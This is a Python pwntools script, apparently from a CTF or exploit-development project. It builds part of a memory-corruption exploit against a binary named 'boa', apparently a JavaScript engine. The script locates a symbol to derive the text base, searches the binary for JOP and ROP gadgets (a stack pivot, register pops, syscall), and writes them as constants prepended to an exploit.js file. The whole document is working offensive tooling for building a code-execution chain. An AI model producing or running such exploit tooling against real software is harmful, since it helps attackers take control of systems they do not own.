#!/usr/bin/env python3

"""

This script will calculate required offsets and prepend
them to the exploit script as globals

This exploit only requires the binary, there are no libc offsets needed!

"""

from pwn import *
import os
import json
import hashlib
import binascii

context.arch = 'amd64'

def hash_file(filename):
   h = hashlib.sha1()
   with open(filename,'rb') as file:
       chunk = 0
       while chunk != b'':
           chunk = file.read(1024)
           h.update(chunk)
   return h.hexdigest()

# Class to lazy load the elf and cache gadgets and symbols
class Cache(object):
    def __init__(self, target, cache_path='.gen.py.cache'):
        self.target = target
        self.hash = hash_file(target)
        self.cache_path = cache_path
        self.elf = None
        self.cache = {'symbols':{}, 'gadgets':{}}
        if os.path.exists(cache_path):
            with open(cache_path) as f:
                cache = json.load(f)
                if cache['hash'] == self.hash:
                    self.cache = cache.get('cache',self.cache)

    def save(self):
        with open(self.cache_path, 'w') as f:
            f.write(json.dumps(dict(
                hash = self.hash,
                cache = self.cache,
            )))

    def get_elf(self):
        if self.elf is None:
            self.elf = ELF(self.target)
        return self.elf

    def get_symbol(self, symbol):
        symbol_cache = self.cache['symbols']
        if symbol not in symbol_cache:
            symbol_cache[symbol] = self.get_elf().symbols[symbol]
            self.save()
        return symbol_cache[symbol]

    def get_gadget(self, gadget_bytes, require=True):
        try:
            key = binascii.hexlify(gadget_bytes).decode('utf-8')
            gadget_cache = self.cache['gadgets']
            if key not in gadget_cache:
                gadget_cache[key] = next(
                    self.get_elf()
                    .search( gadget_bytes,
                        writable=False, executable=True)
                )
                self.save()
            return gadget_cache[key]
        except Exception as e:
            if require:
                raise e
            return 0

TARGET = './boa'
cache = Cache(TARGET)

# Generate a ropchain for the binary

prototype_symbol = subprocess.check_output(f'nm {TARGET} | grep ordinary_get_prototype_of', shell=True).strip().split()[-1].decode('utf-8')


TEXT_BASE_OFFSET = cache.get_symbol(prototype_symbol)

# 0x48	0x8b	0x44	0x24	0x68	0xff	0x50	0x20
# mov    rax,QWORD PTR [rsp+0x68]
# call   QWORD PTR [rax+0x20]
JOP_PIVOT_JMP_RAX_20 = cache.get_gadget(b'\x48\x8b\x44\x24\x68\xff\x50\x20', require=False)

# 0x50	0xff	0x20
# push   rax
# jmp    QWORD PTR [rax]
JOP_PUSH_RAX_JMP_RAX = cache.get_gadget(b'\x50\xff\x20', require=False)

ROP_XCHG_RSP_RAX_RET = cache.get_gadget(asm('xchg rsp, rax; ret'), require=False)
ROP_XCHG_RSP_RAX_RET = ROP_XCHG_RSP_RAX_RET or cache.get_gadget(b'\x4c\x94\xc3', require=False)
ROP_XCHG_RSP_RAX_RET = ROP_XCHG_RSP_RAX_RET or cache.get_gadget(b'\x4c\x94\x38\xf6\xc3', require=False)

assert(JOP_PIVOT_JMP_RAX_20 and JOP_PUSH_RAX_JMP_RAX or ROP_XCHG_RSP_RAX_RET)

ROP_POP_RSP_RET = cache.get_gadget(asm('pop rsp; ret'))
ROP_POP_RDI_RET = cache.get_gadget(asm('pop rdi; ret'))
ROP_POP_RSI_RET = cache.get_gadget(asm('pop rsi; ret'))
ROP_POP_RDX_RET = cache.get_gadget(asm('pop rdx; ret'))
ROP_POP_RAX_RET = cache.get_gadget(asm('pop rax; ret'))
ROP_SYSCALL = cache.get_gadget(asm('syscall'))


def add_constants(**args):
    out = ''
    for k,v in args.items():
        out += f'const {k} = {v}n;\n'
    return out

def _add_constants(*args):
    l = 'add_constants('
    for v in args:
        l += f'{v}={v},'
    return l+')'

EXP = eval(_add_constants(
    'TEXT_BASE_OFFSET',
    'JOP_PIVOT_JMP_RAX_20',
    'JOP_PUSH_RAX_JMP_RAX',
    'ROP_XCHG_RSP_RAX_RET',
    'ROP_POP_RSP_RET',
    'ROP_POP_RDI_RET',
    'ROP_POP_RSI_RET',
    'ROP_POP_RDX_RET',
    'ROP_POP_RAX_RET',
    'ROP_SYSCALL',
))
with open('./exploit.js','r') as f:
    EXP += f.read()

with open('final_exploit_with_offsets.js','w') as f:
    f.write(EXP)
